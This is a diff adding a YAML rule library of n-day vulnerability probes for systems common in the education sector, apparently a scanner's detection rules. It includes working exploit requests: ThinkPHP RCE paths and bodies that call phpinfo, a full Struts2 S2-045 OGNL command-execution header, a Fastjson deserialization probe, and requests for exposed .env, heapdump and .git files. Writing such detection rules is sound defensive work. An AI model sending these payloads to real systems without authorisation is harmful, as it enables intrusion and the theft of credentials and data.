@@ -1,0 +1,227 @@
+# Nday POC 规则库 — 教育行业常见漏洞检测
+# 仅做存在性探测，不执行实际利用
+
+rules:
+  # ── Apache Shiro RememberMe 反序列化 ──
+  - id: shiro-rememberme
+    name: "Apache Shiro RememberMe 反序列化 (Shiro-550)"
+    fingerprint: Apache Shiro
+    method: GET
+    path: "/"
+    headers:
+      Cookie: "rememberMe=1"
+    match:
+      status: [200]
+      headers:
+        Set-Cookie: "rememberMe=deleteMe"
+    severity: critical
+
+  # ── Spring Boot Actuator ──
+  - id: springboot-env
+    name: "Spring Boot Actuator env 端点泄露"
+    fingerprint: Spring Boot
+    method: GET
+    path: "/actuator/env"
+    match:
+      status: [200]
+      body:
+        - "java.version"
+        - "spring.datasource"
+    severity: high
+
+  - id: springboot-heapdump
+    name: "Spring Boot Actuator heapdump 下载"
+    fingerprint: Spring Boot
+    method: GET
+    path: "/actuator/heapdump"
+    match:
+      status: [200]
+      headers:
+        Content-Type: "application/octet-stream"
+    severity: high
+
+  - id: springboot-mappings
+    name: "Spring Boot Actuator mappings 端点泄露"
+    fingerprint: Spring Boot
+    method: GET
+    path: "/actuator/mappings"
+    match:
+      status: [200]
+      body:
+        - "dispatcherServlet"
+        - "handler"
+    severity: medium
+
+  # ── ThinkPHP RCE ──
+  - id: thinkphp-rce-v5
+    name: "ThinkPHP 5.x 远程代码执行"
+    fingerprint: ThinkPHP
+    method: GET
+    path: "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
+    match:
+      status: [200]
+      body:
+        - "phpinfo()"
+        - "PHP Version"
+    severity: critical
+
+  - id: thinkphp-rce-v5023
+    name: "ThinkPHP 5.0.23 RCE"
+    fingerprint: ThinkPHP
+    method: POST
+    path: "/index.php?s=captcha"
+    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"
+    match:
+      status: [200]
+      body:
+        - "PHP Version"
+    severity: critical
+
+  # ── Laravel ──
+  - id: laravel-env
+    name: "Laravel .env 配置文件泄露"
+    fingerprint: Laravel
+    method: GET
+    path: "/.env"
+    match:
+      status: [200]
+      body:
+        - "APP_KEY"
+        - "DB_PASSWORD"
+    severity: high
+
+  - id: laravel-debug
+    name: "Laravel Debug 模式信息泄露"
+    fingerprint: Laravel
+    method: GET
+    path: "/_ignition/health-check"
+    match:
+      status: [200]
+      body:
+        - "canRun"
+        - "laravel"
+    severity: medium
+
+  # ── Fastjson ──
+  - id: fastjson-detect
+    name: "Fastjson 反序列化漏洞探测"
+    fingerprint: ""
+    method: POST
+    path: "/"
+    headers:
+      Content-Type: "application/json"
+    body: '{"@type":"java.net.Inet4Address","val":"fastjson.detect.test"}'
+    match:
+      status: [200, 400, 500]
+      body:
+        - "fastjson"
+        - "JSONException"
+        - "parseObject"
+    severity: high
+
+  # ── Druid Monitor ──
+  - id: druid-unauth
+    name: "Alibaba Druid Monitor 未授权访问"
+    fingerprint: ""
+    method: GET
+    path: "/druid/index.html"
+    match:
+      status: [200]
+      body:
+        - "Druid Stat"
+        - "Druid Monitor"
+    severity: high
+
+  - id: druid-api
+    name: "Druid JSON API 数据泄露"
+    fingerprint: ""
+    method: GET
+    path: "/druid/datasource.json"
+    match:
+      status: [200]
+      body:
+        - "jdbcUrl"
+    severity: high
+
+  # ── Swagger UI ──
+  - id: swagger-unauth
+    name: "Swagger API 文档未授权访问"
+    fingerprint: ""
+    method: GET
+    path: "/swagger-ui.html"
+    match:
+      status: [200]
+      body:
+        - "swagger"
+    severity: medium
+
+  # ── Tomcat ──
+  - id: tomcat-manager
+    name: "Tomcat Manager 应用未授权"
+    fingerprint: Tomcat
+    method: GET
+    path: "/manager/html"
+    match:
+      status: [200, 401]
+      headers:
+        WWW-Authenticate: "Basic realm=\"Tomcat Manager Application\""
+    severity: medium
+
+  # ── Struts2 S2-045 ──
+  - id: struts2-s045
+    name: "Struts2 S2-045 远程代码执行"
+    fingerprint: Apache Struts
+    method: POST
+    path: "/"
+    headers:
+      Content-Type: "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo_s2_vuln_test').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+    match:
+      status: [200]
+      body:
+        - "s2_vuln_test"
+    severity: critical
+
+  # ── DedeCMS ──
+  - id: dedecms-ver
+    name: "DedeCMS 版本信息泄露"
+    fingerprint: DedeCMS
+    method: GET
+    path: "/data/admin/ver.txt"
+    match:
+      status: [200]
+    severity: low
+
+  # ── 通用 ──
+  - id: git-leak
+    name: "Git 源码泄露"
+    fingerprint: ""
+    method: GET
+    path: "/.git/HEAD"
+    match:
+      status: [200]
+      body:
+        - "ref: refs/"
+    severity: high
+
+  - id: phpinfo
+    name: "phpinfo 页面暴露"
+    fingerprint: PHP
+    method: GET
+    path: "/phpinfo.php"
+    match:
+      status: [200]
+      body:
+        - "PHP Version"
+        - "phpinfo()"
+    severity: medium
+
+  - id: spring-gateway
+    name: "Spring Cloud Gateway Actuator RCE"
+    fingerprint: Spring Boot
+    method: GET
+    path: "/actuator/gateway/routes"
+    match:
+      status: [200]
+      body:
+        - "route_id"
+    severity: critical
